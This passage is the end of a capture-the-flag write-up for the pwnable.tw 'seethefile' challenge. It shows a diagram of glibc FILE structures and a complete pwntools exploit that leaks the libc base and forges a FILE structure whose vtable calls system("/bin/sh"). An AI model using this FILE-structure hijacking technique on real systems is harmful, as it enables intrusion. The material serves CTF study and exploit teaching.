id="mx-clip-378-747-152-34-0"><rect height="34" width="152" x="378" y="747"/></clipPath><clipPath id="mx-clip-378-788-152-34-0"><rect height="34" width="152" x="378" y="788"/></clipPath><clipPath id="mx-clip-378-830-152-34-0"><rect height="34" width="152" x="378" y="830"/></clipPath><clipPath id="mx-clip-378-871-152-34-0"><rect height="34" width="152" x="378" y="871"/></clipPath></defs><g><path d="M 179 26 L 179 0 L 349 0 L 349 26" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 179 26 L 179 781.8 L 349 781.8 L 349 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 179 26 L 349 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" text-anchor="middle" font-weight="bold"><text x="263.5" y="17">_IO_FILE</text></g><g fill="#000000" font-family="Helvetica" font-size="10.999999999999998px" clip-path="url(#mx-clip-183-26-162-34-0)"><text x="184.5" y="47">int _flags;</text></g><path d="M 179 64 L 349 64" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-68-162-32-0)"><text x="184.5" y="88.55">char* _IO_read_ptr;</text></g><path d="M 179 104.1 L 349 104.1" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-108-162-32-0)"><text x="184.5" y="128.65">char* _IO_read_end;</text></g><path d="M 179 144.2 L 349 144.2" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-148-162-32-0)"><text x="184.5" y="168.75">char* _IO_read_base;</text></g><path d="M 179 184.3 L 349 184.3" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-188-162-32-0)"><text x="184.5" y="208.85">char* _IO_write_base;</text></g><path d="M 179 224.4 L 349 224.4" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-228-162-32-0)"><text x="184.5" y="248.95">char* _IO_write_ptr;</text></g><path d="M 179 264.5 L 349 264.5" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-268-162-32-0)"><text x="184.5" y="289.05">char* _IO_write_end;</text></g><path d="M 179 304.6 L 349 304.6" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-309-162-32-0)"><text x="184.5" y="329.15">char* _IO_buf_base;</text></g><path d="M 179 344.7 L 349 344.7" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-349-162-32-0)"><text x="184.5" y="369.25">char* _IO_buf_end;</text></g><path d="M 179 384.8 L 349 384.8" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-389-162-32-0)"><text x="184.5" y="409.35">char *_IO_save_base; </text></g><path d="M 179 424.9 L 349 424.9" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-429-162-32-0)"><text x="184.5" y="449.45">char *_IO_backup_base;</text></g><path d="M 179 465 L 349 465" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-469-162-32-0)"><text x="184.5" y="489.55">char *_IO_save_end;</text></g><path d="M 179 505.1 L 349 505.1" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-509-162-32-0)"><text x="184.5" y="529.65">struct _IO_marker *_markers;</text></g><path d="M 179 545.2 L 349 545.2" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-549-162-32-0)"><text x="184.5" y="569.75">struct _IO_FILE *_chain;</text></g><path d="M 179 585.3 L 349 585.3" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-589-162-32-0)"><text x="184.5" y="609.85">int _fileno;</text></g><path d="M 179 625.4 L 349 625.4" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-629-162-32-0)"><text x="184.5" y="649.95">int _flags2;</text></g><path d="M 179 665.5 L 349 665.5" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-670-162-32-0)"><text x="184.5" y="690.05">_IO_off_t _old_offset;</text></g><path d="M 179 705.6 L 349 705.6" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-710-162-32-0)"><text x="184.5" y="730.15">... columns</text></g><path d="M 179 745.7 L 349 745.7" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-183-750-162-32-0)"><text x="184.5" y="770.25">_IO_lock_t *_lock;</text></g><path d="M 0 26 L 0 0 L 160 0 L 160 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 0 26 L 0 821.5 L 160 821.5 L 160 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 0 26 L 160 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="10.999999999999998px" text-anchor="middle" font-weight="bold"><text x="79.5" y="17">_IO_FILE_plus</text></g><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-4-26-152-751-0)" text-anchor="middle"><text x="79.5" y="406.25">_IO_FILE file;</text></g><path d="M 0 781.5 L 160 781.5" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-4-785-152-36-0)"><text x="5.5" y="808">struct _IO_jump_t *vtable;</text></g><path d="M 612.5 13.77 L 612.5 25.84" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 655 13.77 L 655 25.84" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 697.5 25.84 L 697.5 13.77" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 740 25.84 L 740 13.77" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 570 25.84 L 570 13.77" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)scale(0.9999999999999999)"><switch><foreignObject height="101%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="101%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 591px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap;">1</div></div></div></foreignObject><text x="591" y="15" font-size="12px" fill="#000000" font-family="Helvetica" text-anchor="middle">1</text></switch></g><g transform="translate(-0.5 -0.5)scale(0.9999999999999999)"><switch><foreignObject height="101%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="101%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 633px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap;">2</div></div></div></foreignObject><text x="633" y="15" font-size="12px" fill="#000000" font-family="Helvetica" text-anchor="middle">2</text></switch></g><g transform="translate(-0.5 -0.5)scale(0.9999999999999999)"><switch><foreignObject height="101%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="101%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 676px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap;">3</div></div></div></foreignObject><text x="676" y="15" font-size="12px" fill="#000000" font-family="Helvetica" text-anchor="middle">3</text></switch></g><g transform="translate(-0.5 -0.5)scale(0.9999999999999999)"><switch><foreignObject height="101%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="101%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 12px; margin-left: 718px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap;">4</div></div></div></foreignObject><text x="718" y="15" font-size="12px" fill="#000000" font-family="Helvetica" text-anchor="middle">4</text></switch></g><rect height="840.16" width="170" x="570" y="24.84" fill="none" pointer-events="none" stroke="#000000"/><g fill="#000000" font-family="Courier New" font-size="10.999999999999998px" clip-path="url(#mx-clip-574-746-162-41-0)" text-anchor="middle"><text x="654.5" y="770.31">0x804b0a0 (filename+32)</text></g><path d="M 570 786.2 L 740 786.2" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="11.999999999999998px" clip-path="url(#mx-clip-574-785-162-41-0)" text-anchor="middle"><text x="654.5" y="809.55">0x804b2a8 (name+72)</text></g><path d="M 570 824.94 L 740 824.94" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-820-162-44-0)" text-anchor="middle"><text x="654.5" y="848.16">&amp;system</text></g><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-27-162-41-0)" text-anchor="middle"><text x="654.5" y="53.35">0xFFFFDFFF</text></g><path d="M 570 67.74 L 740 67.74" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-106-162-41-0)" text-anchor="middle"><text x="654.5" y="131.91">n/sh</text></g><path d="M 570 146.31 L 740 146.31" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-186-162-41-0)" text-anchor="middle"><text x="654.5" y="211.93">AAAA</text></g><path d="M 570 226.32 L 740 226.32" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-226-162-41-0)" text-anchor="middle"><text x="654.5" y="251.94">AAAA</text></g><path d="M 570 266.33 L 740 266.33" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-266-162-41-0)" text-anchor="middle"><text x="654.5" y="291.95">AAAA</text></g><path d="M 570 306.34 L 740 306.34" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-306-162-41-0)" text-anchor="middle"><text x="654.5" y="331.95">AAAA</text></g><path d="M 570 346.35 L 740 346.35" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-386-162-41-0)" text-anchor="middle"><text x="654.5" y="411.97">AAAA</text></g><path d="M 570 426.36 L 740 426.36" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-426-162-41-0)" text-anchor="middle"><text x="654.5" y="451.98">AAAA</text></g><path d="M 570 466.37 L 740 466.37" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-466-162-41-0)" text-anchor="middle"><text x="654.5" y="491.98">AAAA</text></g><path d="M 570 506.38 L 740 506.38" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-506-162-41-0)" text-anchor="middle"><text x="654.5" y="531.99">AAAA</text></g><path d="M 570 546.39 L 740 546.39" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-546-162-41-0)" text-anchor="middle"><text x="654.5" y="572">AAAA</text></g><path d="M 570 586.39 L 740 586.39" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-586-162-41-0)" text-anchor="middle"><text x="654.5" y="612.01">AAAA</text></g><path d="M 570 626.4 L 740 626.4" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-626-162-41-0)" text-anchor="middle"><text x="654.5" y="652.02">AAAA</text></g><path d="M 570 666.41 L 740 666.41" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-666-162-41-0)" text-anchor="middle"><text x="654.5" y="692.02">AAAA</text></g><path d="M 570 706.42 L 740 706.42" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-706-162-41-0)" text-anchor="middle"><text x="654.5" y="732.03">AAAA</text></g><path d="M 570 746.42 L 740 746.42" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 740 805.05 L 770.05 805 L 770.05 765.84 L 740.05 765.84 L 742.24 765.99" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 748.1 762.46 L 741.12 765.99 L 748.14 769.46" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 770 26 L 742.24 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 748.12 22.5 L 741.12 26 L 748.12 29.5" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)scale(0.9999999999999999)"><switch><foreignObject height="101%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="101%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 1px; height: 1px; padding-top: 26px; margin-left: 772px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap;"><font face="Courier New" style="font-size: 14px">name (0x804b260)</font></div></div></div></foreignObject><text x="772" y="30" font-size="14px" fill="#000000" font-family="Helvetica">name (0x804b260)</text></switch></g><path d="M 349 47.95 L 510.05 47.95 L 567.76 47.85" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10" stroke-dasharray="2.9999999999999996 2.9999999999999996"/><path d="M 561.89 51.36 L 568.88 47.85 L 561.88 44.36" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-66-162-41-0)" text-anchor="middle"><text x="654.5" y="91.89">;/bi</text></g><path d="M 570 106.28 L 740 106.28" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-146-162-41-0)" text-anchor="middle"><text x="654.5" y="171.89">;AAA</text></g><path d="M 570 186.28 L 740 186.28" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 767.92 370.04 L 770.05 370.05 L 742.24 369.32" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 748.21 365.98 L 741.12 369.29 L 748.02 372.97" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)scale(0.9999999999999999)"><switch><foreignObject height="101%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="101%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 1px; height: 1px; padding-top: 368px; margin-left: 772px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 14px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: none; white-space: nowrap;"><div style="text-align: right ; font-size: 14px"><span style="font-family: &quot;courier new&quot; ; font-size: 14px">fp (0x804b280</span><span style="font-family: &quot;courier new&quot; ; font-size: 14px">)</span></div></div></div></div></foreignObject><text x="772" y="372" font-size="14px" fill="#000000" font-family="Helvetica">fp (0x804b280)</text></switch></g><g fill="#000000" font-family="Courier New" font-size="13.999999999999998px" clip-path="url(#mx-clip-574-346-162-41-0)" text-anchor="middle"><text x="654.5" y="371.89">0x804b260 (name)</text></g><path d="M 570 386.28 L 740 386.28" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 570 366.37 L 540.05 366.37 L 540.05 26.05 L 566.91 26" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 561.04 29.51 L 568.03 25.99 L 561.02 22.51" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 349 765.75 L 360.05 765.84 L 360.05 666.05 L 550.05 666.05 L 550.05 766.05 L 565.76 766.01" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10" stroke-dasharray="2.9999999999999996 2.9999999999999996"/><path d="M 559.89 769.52 L 566.88 766 L 559.87 762.52" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 160 803.53 L 179.95 803.53 L 179.95 916.05 L 550.05 916.05 L 550.05 805 L 567.76 805.04" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10" stroke-dasharray="2.9999999999999996 2.9999999999999996"/><path d="M 561.87 808.53 L 568.88 805.04 L 561.89 801.53" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 374 747 L 374 721 L 534 721 L 534 747" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 374 747 L 374 905 L 534 905 L 534 747" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><path d="M 374 747 L 534 747" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="10.999999999999998px" text-anchor="middle" font-weight="bold"><text x="453.5" y="738">_IO_jump_t</text></g><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-378-747-152-34-0)"><text x="379.5" y="768.25">void* __dummy</text></g><path d="M 374 784.5 L 534 784.5" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-378-788-152-34-0)"><text x="379.5" y="809.75">void* __dummy2</text></g><path d="M 374 826 L 534 826" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-378-830-152-34-0)"><text x="379.5" y="851.25">void* __finish</text></g><path d="M 374 867.5 L 534 867.5" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/><g fill="#000000" font-family="Helvetica" font-size="11.999999999999998px" clip-path="url(#mx-clip-378-871-152-34-0)"><text x="379.5" y="892.75">...</text></g><path d="M 534 846.75 L 534.05 843 L 560.05 843 L 567.77 842.73" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10" stroke-dasharray="0.9999999999999999 0.9999999999999999"/><path d="M 562.01 846.43 L 568.88 842.7 L 561.77 839.44" fill="none" pointer-events="none" stroke="#000000" stroke-miterlimit="10"/></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a target="_blank" transform="translate(0,-5)" xlink:href="https://desk.draw.io/support/solutions/articles/16000042487"><text x="50%" y="100%" font-size="10px" text-anchor="middle">Viewer does not support full SVG 1.1</text></a></switch></svg><h2 id="final-script">Final Script</h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*

</span><span style="color:#323232;">context.binary </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;./seethefile&#39;

</span><span style="color:#323232;">elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./seethefile&#39;</span><span style="color:#323232;">)
libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./libc_32.so.6&#39;</span><span style="color:#323232;">)

r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&#39;chall.pwnable.tw&#39;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10200</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">openfile</span><span style="color:#323232;">(path):
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;1&quot;</span><span style="color:#323232;">)
        r.recvuntil(</span><span style="color:#183691;">&quot;see :&quot;</span><span style="color:#323232;">)
        r.sendline(path)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">readfile</span><span style="color:#323232;">():
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;2&quot;</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">writefile</span><span style="color:#323232;">():
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;3&quot;</span><span style="color:#323232;">)
        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)[:</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#62a35c;">len</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)]

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">closefile</span><span style="color:#323232;">():
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;4&quot;</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">exit</span><span style="color:#323232;">(name):
        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
        r.sendline(</span><span style="color:#183691;">&quot;5&quot;</span><span style="color:#323232;">)
        r.recvuntil(</span><span style="color:#183691;">&#39;name :&#39;</span><span style="color:#323232;">)
        r.sendline(name)

openfile(</span><span style="color:#183691;">&#39;/proc/self/maps&#39;</span><span style="color:#323232;">)
readfile()
readfile()

libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">int</span><span style="color:#323232;">([x.split(</span><span style="color:#183691;">&#39;-&#39;</span><span style="color:#323232;">)[</span><span style="color:#0086b3;">0</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">x </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">writefile().split(</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">x.endswith(</span><span style="color:#183691;">&#39;.so&#39;</span><span style="color:#323232;">)][</span><span style="color:#0086b3;">0</span><span style="color:#323232;">], </span><span style="color:#0086b3;">16</span><span style="color:#323232;">)

info(</span><span style="color:#183691;">&quot;Found libc base &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(libc.address))
info(</span><span style="color:#183691;">&quot;Address of system &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]))

file </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;&quot;                                       </span><span style="font-style:italic;color:#969896;"># file
</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">0xFFFFDFFF</span><span style="color:#323232;">)                         </span><span style="font-style:italic;color:#969896;"># file-&gt;_flags  set _IO_IS_FILEBUF bit to false
</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&quot;;/bin/sh;&quot;                             </span><span style="font-style:italic;color:#969896;"># file-&gt;???     to be interpreted as a string

</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">file.ljust(</span><span style="color:#0086b3;">32</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;A&#39;</span><span style="color:#323232;">)                   </span><span style="font-style:italic;color:#969896;"># padding to reach *fp
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">])             </span><span style="font-style:italic;color:#969896;"># *fp           overwrite *fp to point to the start of the name buffer
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;`&#39;                                  </span><span style="font-style:italic;color:#969896;"># padding
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(</span><span style="color:#0086b3;">72</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">37</span><span style="color:#323232;">)                        </span><span style="font-style:italic;color:#969896;"># padding
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;filename&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">32</span><span style="color:#323232;">)    </span><span style="font-style:italic;color:#969896;"># file-&gt;_lock   vtable-&gt;__dummy
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">72</span><span style="color:#323232;">)        </span><span style="font-style:italic;color:#969896;"># file-&gt;vtable  vtable-&gt;__dummy2
</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">])          </span><span style="font-style:italic;color:#969896;">#               vtable-&gt;__finish

</span><span style="color:#323232;">exit(payload)

r.interactive()
